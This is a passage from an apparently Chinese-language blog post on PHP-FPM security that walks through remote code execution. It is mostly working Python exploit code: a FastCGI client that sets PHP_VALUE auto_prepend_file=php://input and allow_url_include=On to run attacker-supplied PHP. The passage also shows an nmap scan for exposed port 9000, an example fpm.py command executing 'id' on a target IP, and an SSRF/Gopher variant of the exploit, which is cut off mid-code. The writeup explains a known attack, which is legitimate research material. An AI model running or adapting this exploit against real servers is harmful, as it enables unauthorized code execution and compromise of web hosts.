__FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="keyword">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="keyword">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure><p>前面的大部分代码都是编写FastCGI客户端的，是参照Github上已经造好的轮子，这里不多说：<a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">https://github.com/wuyunfeng/Python-FastCGI-Client</a></p><p>我们分析下主要的代码逻辑：程序解析完输入参数后，新建一个FastCGI客户端连接，接着重点是构造下面的报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &apos;GATEWAY_INTERFACE&apos;: &apos;FastCGI/1.0&apos;,</span><br><span class="line">    &apos;REQUEST_METHOD&apos;: &apos;POST&apos;,</span><br><span class="line">    &apos;SCRIPT_FILENAME&apos;: documentRoot + uri.lstrip(&apos;/&apos;),</span><br><span class="line">    &apos;SCRIPT_NAME&apos;: uri,</span><br><span class="line">    &apos;QUERY_STRING&apos;: &apos;&apos;,</span><br><span class="line">    &apos;REQUEST_URI&apos;: uri,</span><br><span class="line">    &apos;DOCUMENT_ROOT&apos;: documentRoot,</span><br><span class="line">    &apos;SERVER_SOFTWARE&apos;: &apos;php/fcgiclient&apos;,</span><br><span class="line">    &apos;REMOTE_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;REMOTE_PORT&apos;: &apos;9985&apos;,</span><br><span class="line">    &apos;SERVER_ADDR&apos;: &apos;127.0.0.1&apos;,</span><br><span class="line">    &apos;SERVER_PORT&apos;: &apos;80&apos;,</span><br><span class="line">    &apos;SERVER_NAME&apos;: &quot;localhost&quot;,</span><br><span class="line">    &apos;SERVER_PROTOCOL&apos;: &apos;HTTP/1.1&apos;,</span><br><span class="line">    &apos;CONTENT_TYPE&apos;: &apos;application/text&apos;,</span><br><span class="line">    &apos;CONTENT_LENGTH&apos;: &quot;%d&quot; % len(content),</span><br><span class="line">    &apos;PHP_VALUE&apos;: &apos;auto_prepend_file = php://input&apos;,</span><br><span class="line">    &apos;PHP_ADMIN_VALUE&apos;: &apos;allow_url_include = On&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里环境变量的设置按照前面分析的来就可以了，SCRIPT_NAME设置的是我们输入的PHP文件的参数如<code>/usr/local/lib/php/PEAR.php</code>，PHP_VALUE设置auto_prepend_file = php://input，PHP_ADMIN_VALUE设置allow_url_include = On。</p><p>报文参数设置完之后，带上用户参数输入的作为POST的Body内容向暴露于公网的PHP-FPM服务发送该FastCGI报文即可实现攻击利用。</p><h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>现在我们以攻击者的角度来进行攻击利用。</p><p>首先攻击者用nmap等端口扫描工具批量扫描，发现某台公网IP开启了9000端口：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/7.png" alt=""></p><p>然后简单粗暴地应用P牛的脚本直接打，即可执行远程代码：</p><p><code>python .\fpm.py -c &#39;&lt;?php echo</code>id<code>;exit;?&gt;&#39; 1.1.1.1 /usr/local/lib/php/PEAR.php</code></p><p><img src="/2019/08/25/浅谈PHP-FPM安全/6.png" alt=""></p><p>对比下就知道，可能漏洞利用原理较复杂，但靠着脚本工具的利用就是分分钟的事。</p><h2 id="0x05-SSRF攻击本地PHP-FPM"><a href="#0x05-SSRF攻击本地PHP-FPM" class="headerlink" title="0x05 SSRF攻击本地PHP-FPM"></a>0x05 SSRF攻击本地PHP-FPM</h2><h3 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h3><p>PHP-FPM开放在公网上的情况是很少的，大部分时候都是启动在本地即监听127.0.0.1:9000地址的。</p><p>虽然我们没有办法直接对PHP-FPM发起攻击，但是我们可以结合其他漏洞来间接利用。如果目标站点存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果。</p><h4 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h4><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码，其中攻击代码就是恶意FastCGI协议报文。</p><h4 id="Exp脚本分析"><a href="#Exp脚本分析" class="headerlink" title="Exp脚本分析"></a>Exp脚本分析</h4><p>那么Exp如何修改呢？</p><p>在P牛脚本的基础上进行修改，代码来自：<a href="https://cloud.tencent.com/developer/article/1425023" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1425023</a></p><p>修改点在于：将原本的FastCGI客户端类中request()方法中的发送请求的代码注释掉，因为这里FPM并没有启在公网；接着，在最后的主程序逻辑中修改最后两行代码为在调用前面修改过的request()函数来获取返回的TCP流，对该返回数据进行URL编码然后拼接成Gopher协议的形式即可。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"> </span><br><span class="line">PY2 = <span class="keyword">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="keyword">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = 